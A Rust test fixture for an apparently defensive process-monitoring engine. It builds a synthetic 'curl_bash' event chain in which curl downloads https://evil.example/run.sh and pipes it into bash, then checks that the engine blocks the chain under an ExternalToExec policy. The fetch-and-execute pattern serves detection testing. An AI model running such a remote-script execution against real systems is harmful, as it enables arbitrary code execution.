use crate::events::{Endpoint, Event, Fd, PipeId, ProcessId, StartTime, Timestamp};

use super::Scenario;

pub fn curl_bash() -> Scenario {
    let curl = ProcessId::new(200, StartTime(1_000));
    let bash = ProcessId::new(201, StartTime(1_010));
    let bash_exec = ProcessId::new(201, StartTime(1_011));
    let endpoint = Endpoint::tcp("evil.example", 443);

    Scenario::new(
        "curl_bash",
        vec![
            Event::AgentLaunch {
                process: curl.clone(),
                command: vec!["curl".into(), "https://evil.example/run.sh".into()],
                at: Timestamp(1),
            },
            Event::Pipe {
                process: curl.clone(),
                pipe: PipeId(1),
                read_fd: Fd(4),
                write_fd: Fd(5),
                at: Timestamp(2),
            },
            Event::Fork {
                parent: curl.clone(),
                child: bash.clone(),
                at: Timestamp(3),
            },
            Event::Dup {
                process: bash.clone(),
                from_fd: Fd(4),
                to_fd: Fd(0),
                at: Timestamp(4),
            },
            Event::Connect {
                process: curl.clone(),
                fd: Fd(3),
                endpoint: endpoint.clone(),
                at: Timestamp(5),
            },
            Event::Recv {
                process: curl.clone(),
                fd: Fd(3),
                len: 128,
                at: Timestamp(6),
            },
            Event::Write {
                process: curl.clone(),
                fd: Fd(5),
                len: 128,
                at: Timestamp(7),
            },
            Event::Read {
                process: bash.clone(),
                fd: Fd(0),
                len: 128,
                at: Timestamp(8),
            },
            Event::Exec {
                parent: bash,
                child: bash_exec,
                program: "/bin/bash".into(),
                argv: vec!["bash".into()],
                at: Timestamp(9),
            },
        ],
    )
}

#[cfg(test)]
mod tests {
    use crate::graph::EdgeKind;
    use crate::policy::{DecisionKind, PolicyId};
    use crate::scenarios::ScenarioRunner;

    use super::curl_bash;

    #[test]
    fn curl_bash_blocks_external_exec_with_full_explanation() {
        let scenario = curl_bash();

        let outcome = ScenarioRunner::new().run(&scenario);

        assert_eq!(outcome.graph.edges.len(), 5);
        assert!(
            outcome
                .graph
                .edges
                .iter()
                .any(|edge| edge.kind == EdgeKind::Fork)
        );
        assert_eq!(outcome.enforcement.decision.kind, DecisionKind::Block);
        assert_eq!(outcome.enforcement.decision.violations.len(), 1);
        assert_eq!(
            outcome.enforcement.decision.violations[0].policy,
            PolicyId::ExternalToExec
        );
        assert_eq!(outcome.explanations.len(), 1);
        assert_eq!(outcome.explanations[0].path.len(), 4);
    }
}
